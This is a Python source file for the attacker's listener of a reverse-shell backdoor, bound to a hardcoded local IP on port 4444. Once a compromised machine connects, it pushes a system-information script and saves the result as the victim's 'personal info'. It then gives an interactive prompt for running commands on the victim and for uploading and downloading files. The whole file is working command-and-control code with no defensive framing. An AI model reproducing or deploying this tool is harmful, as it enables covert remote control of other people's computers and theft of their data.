#!usr/bin/env python
import socket
import base64
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def json_recieve(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue
            except ConnectionResetError:
                continue

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def execute_remotely(self, command):
        self.json_send(command)
        return self.json_recieve()

    def write_files(self, path, content):
        if content == "0":
            return "[-] File don't exist"
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            file.close()
            return "[+] Download Successful"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                content = base64.b64encode(file.read())
                return content.decode()
        except IOError:
            return ""

    def run(self):
        #sending py file
        sys_content = self.read_file("sys_info.py")
        psuedo_com = "sys.py" + "\n\n" + sys_content
        result1 = self.execute_remotely(psuedo_com)
        result2 = self.write_files("PC info.txt", result1)
        print("[+] Got personal info")
        while True:
            try:
                path = self.execute_remotely("pwd")
                command = input(path + ">> ")
                if command == "exit":
                    self.json_send(command)
                    print("[*] Exiting")
                    exit()
                if command[0:6] == "upload":
                    content = self.read_file(command[7:])
                    command = command + "\n\n" + content
                result = self.execute_remotely(command)
                if command[0:8] == "download":
                    result = self.write_files(command[9:], result)
                print(result)
            except KeyboardInterrupt:
                self.connection.close()
                print("Closing connection and Exiting")
                exit()


my_listener = Listener("192.168.43.142", 4444)
my_listener.run()